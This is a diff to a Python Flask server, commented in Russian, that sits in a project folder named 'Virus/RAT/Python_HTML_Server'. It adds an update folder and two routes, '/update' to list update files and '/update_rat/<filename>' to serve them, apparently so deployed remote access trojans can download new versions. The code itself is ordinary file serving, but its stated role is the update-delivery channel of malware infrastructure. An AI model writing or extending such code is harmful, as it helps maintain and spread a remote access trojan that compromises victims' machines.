@@ -12,6 +12,7 @@ app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
 
 BASE_DIR = os.getcwd()  # Папка запуска — DarkPi
 app.config["DOWNLOAD_FOLDER"] = os.path.join(BASE_DIR, "Virus", "RAT", "Python_HTML_Server", "Applications")
+app.config["UPDATE_FOLDER"] = os.path.join(BASE_DIR, "Virus", "RAT", "Python_HTML_Server", "Update")
 
 # Создаем папку, если её нет
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
@@ -87,7 +88,44 @@ def download_file(filename):
     except Exception as e:
         print(f"[ERROR] Ошибка при отправке файла: {e}")
         return f"Ошибка при отправке файла: {e}", 500
+    
+@app.route('/update')
+def update_page():
+    update_folder = app.config["UPDATE_FOLDER"]
+    abs_path = os.path.abspath(update_folder)
+    print(f"🔍 Ищем файлы обновлений в директории: {abs_path}")
 
+    if os.path.exists(update_folder):
+        files = os.listdir(update_folder)
+        print(f"✅ Найдены файлы обновлений: {files}")
+    else:
+        files = []
+        print("❌ Папка 'Update' не найдена!")
+
+    return render_template("update_page.html", files=files)
+
+@app.route("/update_rat/<filename>")
+def downoald_and_update_file(filename):
+    folder = app.config["UPDATE_FOLDER"]
+    abs_folder = os.path.abspath(folder)
+    file_path = os.path.join(abs_folder, filename)
+
+    print(f"[DEBUG] Запрошен файл для скачивания: {filename}")
+    print(f"[DEBUG] Папка для скачивания (абсолютный путь): {abs_folder}")
+    print(f"[DEBUG] Полный путь к файлу: {file_path}")
+
+    if not os.path.exists(file_path):
+        print(f"[ERROR] Файл не найден: {file_path}")
+        return "Файл не найден", 404
+
+    try:
+        return send_from_directory(folder, filename, as_attachment=True)
+    except Exception as e:
+        print(f"[ERROR] Ошибка при отправке файла: {e}")
+        return f"Ошибка при отправке файла: {e}", 500
+    
 
 def run_flask():
     app.run(port=5000, debug=True, use_reloader=False)
+
+run_flask()
